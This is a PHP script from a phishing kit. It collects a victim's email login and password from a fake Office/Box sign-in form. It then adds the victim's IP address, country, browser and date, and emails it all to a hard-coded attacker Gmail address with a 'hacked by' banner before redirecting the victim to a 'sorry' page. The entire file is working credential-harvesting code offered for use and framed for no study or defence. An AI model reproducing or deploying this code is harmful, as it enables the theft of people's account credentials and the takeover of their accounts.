<?php
session_start();
$_SESSION['Pdf3'] = $_POST['pdf3'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_SESSION['clientemail'];
$passwd = $_POST['off4'];
$own = 'sassyrit@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'sagaresult@vodking.net';
$domain = 'BOX ';
$subj = "$domain OFFICE $country";
$headers .= "From: VODKING!<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'update.htm';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________MADEMEN CYBER TEAM_________</td></tr>
 <tr><td><STRONG>$domain I.D: $login<td/></tr>
 <tr><td><STRONG>Password: $passwd</td></tr>
 <tr><td><STRONG>IP: $ip</td></tr>
 <tr><td><STRONG>Date: $server</td></tr>
 <tr><td><STRONG>country : $country</td></tr>
 <tr><td>Browser : $browserAgent</td></tr>
 <tr><td>_____HACKED BY SAGE THE HURT ICE (SKYPE =PAYP ALGENT)_____</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: /phpnet1.php?code=2000700 " );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: ./sorry.htm");
}
?>
